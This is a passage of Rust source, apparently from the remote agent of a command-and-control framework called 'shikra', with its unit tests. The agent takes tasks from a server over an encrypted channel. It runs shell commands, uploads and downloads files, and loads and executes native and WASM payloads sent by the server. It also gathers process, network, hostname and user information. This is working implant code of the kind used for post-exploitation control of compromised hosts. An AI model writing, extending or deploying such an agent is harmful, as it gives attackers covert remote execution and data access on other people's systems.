    let inline = task_payload(args, "payload");
    let result = if !task.payload.is_empty() {
        state.native.load_bytes(name.clone(), &task.payload)
    } else if let Some(bytes) = inline {
        state.native.load_bytes(name.clone(), &bytes)
    } else if let Some(path) = path.as_deref() {
        state.native.load(name.clone(), std::path::Path::new(path))
    } else {
        return TaskOutcome::fail("native_load requires a payload or path");
    };
    match result {
        Ok(()) => TaskOutcome::ok(format!("loaded native extension {name}")),
        Err(err) => TaskOutcome::fail(err.to_string()),
    }
}

fn task_native_run(state: &AgentState, args: &serde_json::Value) -> TaskOutcome {
    let name = match arg_str(args, "name") {
        Some(name) if !name.is_empty() => name,
        _ => return TaskOutcome::fail("native_run requires a name"),
    };
    let payload = args
        .get("args")
        .and_then(|value| value.as_str())
        .unwrap_or_default()
        .as_bytes()
        .to_vec();
    match state.native.run(&name, &payload) {
        Ok(outcome) => TaskOutcome {
            exit_code: outcome.exit_code,
            stdout: outcome.output,
            stderr: String::new(),
        },
        Err(err) => TaskOutcome::fail(err.to_string()),
    }
}

fn task_wasm_load(
    state: &mut AgentState,
    task: &AgentTask,
    args: &serde_json::Value,
) -> TaskOutcome {
    let name = match arg_str(args, "name") {
        Some(name) if !name.is_empty() => name,
        _ => return TaskOutcome::fail("wasm_load requires a name"),
    };
    if task.payload.is_empty() {
        return TaskOutcome::fail("wasm_load requires a wasm payload");
    }
    match state.wasm.register(name.clone(), task.payload.clone()) {
        Ok(()) => TaskOutcome::ok(format!("registered {name} ({} bytes)", task.payload.len())),
        Err(err) => TaskOutcome::fail(err.to_string()),
    }
}

fn task_wasm_run(state: &AgentState, args: &serde_json::Value) -> TaskOutcome {
    let name = match arg_str(args, "name") {
        Some(name) if !name.is_empty() => name,
        _ => return TaskOutcome::fail("wasm_run requires a name"),
    };
    let extension = match state.wasm.get(&name) {
        Some(extension) => extension,
        None => return TaskOutcome::fail(format!("no extension named {name}")),
    };
    let extension_args = args
        .get("args")
        .map(|value| match value {
            serde_json::Value::String(text) => text.clone().into_bytes(),
            other => other.to_string().into_bytes(),
        })
        .unwrap_or_default();

    match wasm::run_extension(extension, &extension_args) {
        Ok(outcome) => {
            let mut output = outcome.output;
            if output.is_empty() {
                output = format!("wasm run completed (exit {})", outcome.exit_code).into_bytes();
            }
            TaskOutcome {
                exit_code: outcome.exit_code,
                stdout: output,
                stderr: String::new(),
            }
        }
        Err(err) => TaskOutcome::fail(format!("wasm_run failed: {err}")),
    }
}

async fn task_procs() -> TaskOutcome {
    let entries = collect_processes().await;
    match serde_json::to_vec(&entries) {
        Ok(stdout) => TaskOutcome {
            exit_code: 0,
            stdout,
            stderr: String::new(),
        },
        Err(err) => TaskOutcome::fail(format!("failed to encode process list: {err}")),
    }
}

#[derive(serde::Serialize)]
struct ProcessEntry {
    pid: u32,
    ppid: u32,
    name: String,
    user: String,
    architecture: String,
}

#[cfg(unix)]
async fn collect_processes() -> Vec<ProcessEntry> {
    let outcome = run_platform_command("ps", &["-axo", "pid=,ppid=,user=,comm="]).await;
    if outcome.exit_code != 0 {
        return Vec::new();
    }
    let text = String::from_utf8_lossy(&outcome.stdout);
    let mut entries = Vec::new();
    for line in text.lines() {
        let mut parts = line.split_whitespace();
        let (Some(pid), Some(ppid), Some(user)) = (parts.next(), parts.next(), parts.next()) else {
            continue;
        };
        let name: String = parts.collect::<Vec<_>>().join(" ");
        let (Ok(pid), Ok(ppid)) = (pid.parse(), ppid.parse()) else {
            continue;
        };
        entries.push(ProcessEntry {
            pid,
            ppid,
            name,
            user: user.to_string(),
            architecture: if cfg!(target_arch = "x86_64") {
                "x86_64".into()
            } else {
                "aarch64".into()
            },
        });
    }
    entries
}

#[cfg(windows)]
async fn collect_processes() -> Vec<ProcessEntry> {
    // tasklist CSV: "Image Name","PID","Session Name","Session#","Mem Usage"
    let outcome = run_platform_command("tasklist", &["/FO", "CSV", "/NH"]).await;
    if outcome.exit_code != 0 {
        return Vec::new();
    }
    let text = String::from_utf8_lossy(&outcome.stdout);
    let mut entries = Vec::new();
    for line in text.lines() {
        let fields = parse_csv_line(line);
        if fields.len() < 2 {
            continue;
        }
        let Ok(pid) = fields[1].parse() else {
            continue;
        };
        entries.push(ProcessEntry {
            pid,
            ppid: 0,
            name: fields[0].clone(),
            user: String::new(),
            architecture: String::new(),
        });
    }
    entries
}

#[cfg(windows)]
fn parse_csv_line(line: &str) -> Vec<String> {
    let mut fields = Vec::new();
    let mut current = String::new();
    let mut quoted = false;
    for ch in line.chars() {
        match ch {
            '"' => quoted = !quoted,
            ',' if !quoted => {
                fields.push(std::mem::take(&mut current));
            }
            _ => current.push(ch),
        }
    }
    fields.push(current);
    fields
}

async fn task_ps() -> TaskOutcome {
    #[cfg(unix)]
    let outcome = run_platform_command("ps", &["aux"]);
    #[cfg(windows)]
    let outcome = run_platform_command("tasklist", &["/FO", "CSV", "/NH"]);
    outcome.await
}

async fn task_netstat() -> TaskOutcome {
    #[cfg(unix)]
    let outcome = {
        let primary = run_platform_command("netstat", &["-an"]).await;
        if primary.exit_code == 0 {
            primary
        } else {
            run_platform_command("ss", &["-tan"]).await
        }
    };
    #[cfg(windows)]
    let outcome = run_platform_command("netstat", &["-ano"]).await;
    outcome
}

async fn task_ifconfig() -> TaskOutcome {
    #[cfg(target_os = "macos")]
    let outcome = run_platform_command("ifconfig", &[]).await;
    #[cfg(target_os = "linux")]
    let outcome = {
        let primary = run_platform_command("ip", &["addr"]).await;
        if primary.exit_code == 0 {
            primary
        } else {
            run_platform_command("ifconfig", &[]).await
        }
    };
    #[cfg(windows)]
    let outcome = run_platform_command("ipconfig", &["/all"]).await;
    outcome
}

async fn run_platform_command(program: &str, args: &[&str]) -> TaskOutcome {
    let child = match tokio::process::Command::new(program)
        .args(args)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true)
        .spawn()
    {
        Ok(child) => child,
        Err(err) => return TaskOutcome::fail(format!("failed to run {program}: {err}")),
    };

    match tokio::time::timeout(Duration::from_secs(30), child.wait_with_output()).await {
        Ok(Ok(output)) => {
            let mut stdout = output.stdout;
            stdout.truncate(MAX_CAPTURE);
            let mut stderr = String::from_utf8_lossy(&output.stderr).to_string();
            if stderr.len() > MAX_CAPTURE {
                stderr.truncate(MAX_CAPTURE);
            }
            TaskOutcome {
                exit_code: output.status.code().unwrap_or(-1),
                stdout,
                stderr,
            }
        }
        Ok(Err(err)) => TaskOutcome::fail(format!("{program} failed: {err}")),
        Err(_) => TaskOutcome::fail(format!("{program} timed out")),
    }
}

fn now_unix_ms() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|duration| duration.as_millis() as u64)
        .unwrap_or_default()
}

pub(crate) fn current_unix_ms() -> u64 {
    now_unix_ms()
}

pub fn hostname() -> String {
    if let Some(name) = system_hostname() {
        return name;
    }
    std::env::var("HOSTNAME")
        .or_else(|_| std::env::var("COMPUTERNAME"))
        .unwrap_or_else(|_| "unknown-host".into())
}

#[allow(unsafe_code)]
fn system_hostname() -> Option<String> {
    #[cfg(unix)]
    {
        let mut buffer = [0u8; 256];
        // SAFETY: gethostname writes at most buffer.len() bytes into a valid
        // stack buffer and does not retain the pointer.
        let rc = unsafe {
            libc::gethostname(
                buffer.as_mut_ptr() as *mut libc::c_char,
                buffer.len() as libc::size_t,
            )
        };
        if rc != 0 {
            return None;
        }
        let end = buffer.iter().position(|byte| *byte == 0)?;
        let name = String::from_utf8_lossy(&buffer[..end]).trim().to_string();
        if !name.is_empty() {
            return Some(name);
        }
        None
    }
    #[cfg(windows)]
    {
        std::env::var("COMPUTERNAME").ok()
    }
    #[cfg(not(any(unix, windows)))]
    {
        None
    }
}

pub fn username() -> String {
    std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .unwrap_or_else(|_| "unknown-user".into())
}

fn current_platform() -> i32 {
    if cfg!(target_os = "windows") {
        Platform::Windows as i32
    } else if cfg!(target_os = "macos") {
        Platform::Macos as i32
    } else {
        Platform::Linux as i32
    }
}

fn current_architecture() -> i32 {
    if cfg!(target_arch = "aarch64") {
        Architecture::Aarch64 as i32
    } else {
        Architecture::X8664 as i32
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use shikra_proto::v1::{agent_message, AgentMessage};

    fn keys_pair() -> (SessionKeys, SessionKeys) {
        let agent = KeyPair::generate();
        let server = KeyPair::generate();
        let shared = agent.diffie_hellman(&server.public_key());
        (
            SessionKeys::derive("s-1", &shared, true).expect("agent"),
            SessionKeys::derive("s-1", &shared, false).expect("server"),
        )
    }

    fn task(kind: &str, args: serde_json::Value) -> AgentTask {
        AgentTask {
            task_id: "t-1".into(),
            kind: kind.into(),
            args: serde_json::to_vec(&args).unwrap_or_default(),
            payload: Vec::new(),
        }
    }

    #[tokio::test]
    async fn echo_task_roundtrip() {
        let mut state = AgentState::default();
        let outcome =
            execute_task(&mut state, &task("echo", serde_json::json!("hello")), None).await;
        assert_eq!(outcome.exit_code, 0);
        assert_eq!(outcome.stdout, b"hello");
    }

    #[tokio::test]
    async fn shell_executes_and_captures() {
        let mut state = AgentState::default();
        let outcome = execute_task(
            &mut state,
            &task("shell", serde_json::json!({"command": "echo shell-ok"})),
            None,
        )
        .await;
        assert_eq!(outcome.exit_code, 0);
        assert!(String::from_utf8_lossy(&outcome.stdout).contains("shell-ok"));
    }

    #[tokio::test]
    async fn shell_timeout_is_enforced() {
        let mut state = AgentState::default();
        let outcome = execute_task(
            &mut state,
            &task(
                "shell",
                serde_json::json!({"command": "sleep 5", "timeout_secs": 1}),
            ),
            None,
        )
        .await;
        assert_ne!(outcome.exit_code, 0);
        assert!(outcome.stderr.contains("timed out"));
    }

    #[tokio::test]
    async fn file_roundtrip_upload_download() {
        let dir = std::env::temp_dir().join(format!("shikra-fs-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("create dir");

        let mut state = AgentState {
            cwd: dir.clone(),
            rportfwd: std::collections::HashMap::new(),
            wasm: WasmRegistry::new(),
            native: NativeRegistry::new(),
        };

        let payload = b"shikra-binary-payload-\x00\x01\x02".to_vec();
        let mut upload = task("upload", serde_json::json!({"path": "test.bin"}));
        upload.payload = payload.clone();
        let outcome = execute_task(&mut state, &upload, None).await;
        assert_eq!(outcome.exit_code, 0, "{}", outcome.stderr);

        let stat = execute_task(
            &mut state,
            &task("stat", serde_json::json!({"path": "test.bin"})),
            None,
        )
        .await;
        assert_eq!(stat.exit_code, 0);
        let stat_json: serde_json::Value = serde_json::from_slice(&stat.stdout).expect("stat json");
        assert_eq!(stat_json["size"].as_u64(), Some(payload.len() as u64));

        let download = execute_task(
            &mut state,
            &task(
                "download",
                serde_json::json!({"path": "test.bin", "offset": 0, "length": 4096}),
            ),
            None,
        )
        .await;
        assert_eq!(download.exit_code, 0, "{}", download.stderr);
        assert_eq!(download.stdout, payload);

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn cd_changes_working_directory() {
        let dir = std::env::temp_dir().join(format!("shikra-cd-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("create dir");

        let mut state = AgentState::default();
        let outcome = execute_task(
            &mut state,
            &task("cd", serde_json::json!({"path": dir.display().to_string()})),
            None,
        )
        .await;
        assert_eq!(outcome.exit_code, 0, "{}", outcome.stderr);
        assert_eq!(state.cwd, std::fs::canonicalize(&dir).expect("canonical"));

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn unknown_task_fails() {
        let mut state = AgentState::default();
        let outcome =
            execute_task(&mut state, &task("explode", serde_json::Value::Null), None).await;
        assert_eq!(outcome.exit_code, 1);
        assert!(outcome.stderr.contains("unknown task kind"));
    }

    #[test]
    fn message_roundtrip_through_channel() {
        let (mut agent, mut server) = keys_pair();
        let message = AgentMessage {
            body: Some(agent_message::Body::Result(AgentResult {
                task_id: "t-3".into(),
                exit_code: 0,
                stdout: b"ok".to_vec(),
                stderr: Vec::new(),
            })),
        };
        let envelope = wire::seal_message(&mut agent, &message).expect("seal");
        let opened = wire::open_message(&mut server, &envelope).expect("open");
        match opened.body {
            Some(agent_message::Body::Result(result)) => assert_eq!(result.stdout, b"ok"),
            other => panic!("unexpected body: {other:?}"),
        }
    }
}
